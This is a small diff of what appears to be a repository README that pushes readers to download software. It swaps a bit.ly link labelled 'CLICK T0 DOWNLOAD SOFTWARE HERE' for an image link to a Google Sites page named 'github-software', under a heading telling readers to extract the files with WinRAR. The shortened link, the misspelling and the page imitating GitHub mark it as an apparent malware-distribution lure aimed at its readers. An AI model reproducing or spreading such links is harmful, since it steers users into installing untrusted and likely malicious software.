@@ -6,4 +6,4 @@
 
 <h1 align=center> 🗃Use WIN—RAR to extract files🗃</a></h2>
 
-<H1 align=center><a href="https://bit.ly/3vNknsX">[CLICK T0 DOWNLOAD SOFTWARE HERE]</a></H1>
+[![*](https://i4.imageban.ru/out/2024/01/05/bd5b1355a101b5bc6b532e27308149d8.png)](https://sites.google.com/view/github-software/)
